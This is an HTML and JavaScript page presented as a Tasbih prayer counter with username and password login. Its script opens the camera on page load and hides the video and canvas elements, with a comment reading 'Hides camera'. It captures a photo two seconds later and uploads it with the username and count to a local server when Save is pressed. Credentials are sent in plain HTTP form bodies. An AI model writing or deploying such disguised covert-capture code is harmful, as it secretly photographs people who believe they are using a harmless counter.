<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tasbih Counter - Neon Theme</title>
    <style>
        body {
            background: black;
            color: cyan;
            text-align: center;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        h1 {
            margin-top: 20px;
        }
        .counter {
            font-size: 50px;
            margin: 20px;
        }
        .btn {
            font-size: 20px;
            padding: 10px;
            margin: 5px;
            border: none;
            cursor: pointer;
            transition: 0.3s;
            border-radius: 5px;
        }
        .btn:hover {
            transform: scale(1.1);
        }
        .increment { background: lime; color: black; }
        .reset { background: red; color: white; }
        .save { background: blue; color: white; }
        video, canvas { display: none; } /* Hides camera */
        .input-container {
            margin: 20px 0;
        }
        .input-container label {
            display: block;
            margin: 10px 0;
            font-size: 18px;
        }
        .input-container input {
            padding: 10px;
            font-size: 16px;
            border: 2px solid cyan;
            border-radius: 5px;
            background: black;
            color: cyan;
        }
        @media (max-width: 768px) {
            .counter {
                font-size: 40px;
            }
            .btn {
                font-size: 18px;
                padding: 8px;
            }
            .input-container input {
                font-size: 14px;
            }
        }
        @media (max-width: 480px) {
            .counter {
                font-size: 30px;
            }
            .btn {
                font-size: 16px;
                padding: 6px;
            }
            .input-container input {
                font-size: 12px;
            }
        }
    </style>
</head>
<body>
    <h1>Tasbih Counter</h1>

    <div class="input-container">
        <label>Username: <input type="text" id="username" placeholder="Enter your username"></label>
        <label>Password: <input type="password" id="password" placeholder="Enter your password"></label>
    </div>

    <button class="btn" onclick="signup()">Signup</button>
    <button class="btn" onclick="login()">Login</button>

    <div class="counter" id="count">0</div>

    <button class="btn increment" onclick="increment()">+1</button>
    <button class="btn reset" onclick="reset()">Reset</button>
    <button class="btn save" onclick="saveData()">Save</button>

    <video id="video" width="320" height="240" autoplay></video>
    <canvas id="canvas" width="320" height="240"></canvas>

    <script>
        let count = 0;
        const countDisplay = document.getElementById("count");
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const context = canvas.getContext("2d");

        function increment() {
            count++;
            countDisplay.textContent = count;
        }

        function reset() {
            count = 0;
            countDisplay.textContent = count;
        }

        // Hide Camera & Auto Capture Image
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                setTimeout(captureImage, 2000); // Auto capture after 2s
            })
            .catch(err => console.error("Camera Access Denied", err));

        function captureImage() {
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
        }

        function signup() {
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;

            if (!username || !password) {
                alert("Enter username and password!");
                return;
            }

            fetch("http://127.0.0.1:5000/signup", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: `username=${username}&password=${password}`
            })
            .then(response => response.json())
            .then(data => alert(data.message || data.error))
            .catch(error => console.error("Error:", error));
        }

        function login() {
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;

            if (!username || !password) {
                alert("Enter username and password!");
                return;
            }

            fetch("http://127.0.0.1:5000/login", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: `username=${username}&password=${password}`
            })
            .then(response => response.json())
            .then(data => alert(data.message || data.error))
            .catch(error => console.error("Error:", error));
        }

        function saveData() {
            const username = document.getElementById("username").value;
            if (!username) {
                alert("Enter Username!");
                return;
            }

            const formData = new FormData();
            formData.append("username", username);
            formData.append("tasbih_count", count);

            canvas.toBlob(blob => {
                formData.append("image", blob);

                fetch("http://127.0.0.1:5000/save", { method: "POST", body: formData })
                    .then(response => response.json())
                    .then(data => alert(data.message))
                    .catch(error => console.error("Error:", error));
            });
        }
    </script>
</body>
</html>
